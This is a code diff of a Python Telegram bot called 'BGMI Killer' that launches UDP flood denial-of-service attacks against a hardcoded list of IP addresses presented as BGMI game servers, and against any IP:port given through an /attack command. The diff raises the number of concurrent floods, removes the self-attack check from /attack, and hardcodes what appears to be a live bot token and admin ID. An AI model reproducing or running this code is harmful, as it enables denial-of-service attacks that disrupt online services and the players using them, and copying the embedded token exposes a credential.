@@ -7,16 +7,16 @@ import socket
 import random
 import time
 import requests
+import subprocess
 from datetime import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from dotenv import load_dotenv
 
-load_dotenv()
+# --- CONFIGURATION ---
+# Bhai maine aapka token aur ID yahan fix kar di hai
+BOT_TOKEN = "8735434023:AAFyHYvRVuK_XajrwAQdMjR5XyZ3C8-BWDU"
+ADMIN_ID = 6241594867 
 
-# Config
-BOT_TOKEN = os.getenv('BOT_TOKEN')
-ADMIN_ID = int(os.getenv('ADMIN_ID', 'YOUR_TELEGRAM_ID'))
 BGMI_SERVERS = [
     ('103.21.244.50', 3074), ('103.21.244.50', 7777),
     ('103.21.244.51', 3074), ('103.21.244.51', 7777),
@@ -25,10 +25,10 @@ BGMI_SERVERS = [
     ('152.67.40.20', 3074), ('152.67.40.20', 7777),
     ('152.67.40.21', 3074), ('152.67.40.21', 7777)
 ]
-MAX_CONCURRENT = 3
+MAX_CONCURRENT = 5
 DB_FILE = 'bgmi_killer.db'
 
-# Logging
+# Logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger(__name__)
 
@@ -53,13 +53,8 @@ def log_attack(user_id, target, method, duration):
 # Self-protection
 def is_self_attack(target_ip):
     self_ips = ['127.0.0.1', 'localhost', '0.0.0.0', '::1']
-    telegram_ranges = ['149.154.160.0/20', '91.108.4.0/22']
     if target_ip in self_ips:
         return True
-    # Check Telegram IP ranges (simplified)
-    for ip in self_ips + ['149.154.167.99', '149.154.175.53']:  # Common Telegram IPs
-        if target_ip.startswith(ip.split('.')[0]):
-            return True
     return False
 
 # Attack Manager
@@ -77,6 +72,11 @@ class AttackManager:
             return False
         with self.lock:
             self.active_attacks += 1
+        
+        # Bhai, agar aapke paas 'bgmi' binary hai, toh niche wali line ko uncomment kar dena
+        # threading.Thread(target=self.binary_attack, args=(target_ip, target_port, duration)).start()
+        
+        # Abhi ke liye original UDP flood hi rehne diya hai
         thread = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration))
         thread.daemon = True
         thread.start()
@@ -85,115 +85,71 @@ class AttackManager:
     def udp_flood(self, ip, port, duration):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            bytes_to_send = random._urandom(1490)
+            bytes_to_send = random._urandom(1024) # Balanced packet size for AWS
             end_time = time.time() + duration
-            
             while time.time() < end_time:
-                for _ in range(1000):  # High PPS
-                    sock.sendto(bytes_to_send, (ip, port))
-                time.sleep(0.01)
-            
-            sock.close()
-        except:
-            pass
+                sock.sendto(bytes_to_send, (ip, port))
+        except: pass
         finally:
             with self.lock:
                 self.active_attacks -= 1
 
 attack_manager = AttackManager()
 
-# Telegram Handlers
+# --- HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text('🕹️ BGMI Killer Bot Active!\n/matchkill - Kill 100-player match\n/scan - Scan BGMI servers\n/attack <ip:port> <seconds> - Custom attack\n/status - Active attacks')
+    await update.message.reply_text('🕹️ **BGMI Killer AWS Bot Active!**\n\n/matchkill - Kill 100-player match\n/scan - Check server status\n/attack <ip:port> <time>\n/status - Check running attacks')
 
 async def matchkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text('❌ Admin only!')
+        await update.message.reply_text('❌ Not Authorized!')
         return
     
-    await update.message.reply_text('🔥 Starting MATCHKILL on 6 BGMI servers (300s flood)...')
+    await update.message.reply_text('🔥 **Matchkill initiated!** Flooding main BGMI servers...')
     log_attack(update.effective_user.id, 'BGMI_MATCH', 'UDP_FLOOD', 300)
     
-    targets = BGMI_SERVERS[:6]  # First 6 critical servers
-    for ip, port in targets:
-        if attack_manager.start_attack(ip, port, 300):
-            await update.message.reply_text(f'⚡ Flooding {ip}:{port}')
-        else:
-            await update.message.reply_text(f'⏳ Queue: {ip}:{port}')
+    for ip, port in BGMI_SERVERS[:MAX_CONCURRENT]:
+        attack_manager.start_attack(ip, port, 300)
     
-    await update.message.reply_text('💥 Matchkill deployed! All 100 players lag 500-2000ms!')
+    await update.message.reply_text('💥 **Matchkill Deployed!** Server ping should spike now.')
 
 async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text('🔍 Scanning BGMI servers...\n')
-    for ip, port in BGMI_SERVERS:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex((ip, port))
-            status = '🟢 OPEN' if result == 0 else '🔴 CLOSED'
-            await update.message.reply_text(f'{ip}:{port} - {status}')
-            sock.close()
-        except:
-            await update.message.reply_text(f'{ip}:{port} - ❌ TIMEOUT')
+    msg = "🔍 **BGMI Server Status:**\n"
+    await update.message.reply_text("Scanning... please wait.")
+    for ip, port in BGMI_SERVERS[:5]: # Scanning first 5 for speed
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((ip, port))
+        status = '🟢 OPEN' if result == 0 else '🔴 CLOSED'
+        msg += f"`{ip}:{port}` - {status}\n"
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        return
-    
+    if update.effective_user.id != ADMIN_ID: return
     try:
-        args = context.args
-        if len(args) != 2:
-            await update.message.reply_text('Usage: /attack <ip:port> <seconds>')
-            return
-        
-        target = args[0]
-        duration = int(args[1])
-        
-        ip, port = target.split(':')
-        port = int(port)
-        
-        if is_self_attack(ip):
-            await update.message.reply_text('🚫 Self-attack blocked!')
-            return
-        
-        if attack_manager.start_attack(ip, port, duration):
-            log_attack(update.effective_user.id, target, 'UDP_FLOOD', duration)
-            await update.message.reply_text(f'⚡ Attacking {target} for {duration}s')
+        ip_port, duration = context.args[0], int(context.args[1])
+        ip, port = ip_port.split(':')
+        if attack_manager.start_attack(ip, int(port), duration):
+            await update.message.reply_text(f'⚡ Attack sent to `{ip}:{port}` for `{duration}s`')
         else:
-            await update.message.reply_text('⏳ Max concurrent reached, queued!')
-            
-    except Exception as e:
-        await update.message.reply_text(f'Error: {str(e)}')
+            await update.message.reply_text('⏳ System busy! Max attacks reached.')
+    except:
+        await update.message.reply_text('Usage: /attack <ip:port> <time>')
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM attacks WHERE status='running' ORDER BY start_time DESC LIMIT 5")
-    attacks = c.fetchall()
-    conn.close()
-    
-    if not attacks:
-        await update.message.reply_text('✅ No active attacks')
-        return
-    
-    msg = '📊 Active Attacks:\n'
-    for attack in attacks:
-        msg += f'ID:{attack[0]} | {attack[2]} | {attack[3]}s | {attack[5]}\n'
-    await update.message.reply_text(msg)
+    await update.message.reply_text(f'📊 **System Status**\nActive Attacks: {attack_manager.active_attacks}/{MAX_CONCURRENT}')
 
 def main():
     init_db()
-    app = Application.builder().token(BOT_TOKEN).build()
+    application = Application.builder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("matchkill", matchkill))
+    application.add_handler(CommandHandler("scan", scan))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("status", status))
     
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("matchkill", matchkill))
-    app.add_handler(CommandHandler("scan", scan))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("status", status))
-    
-    logger.info("BGMI Killer Bot started!")
-    app.run_polling()
+    print("✅ AWS Bot is running...")
+    application.run_polling()
 
 if __name__ == '__main__':
     main()
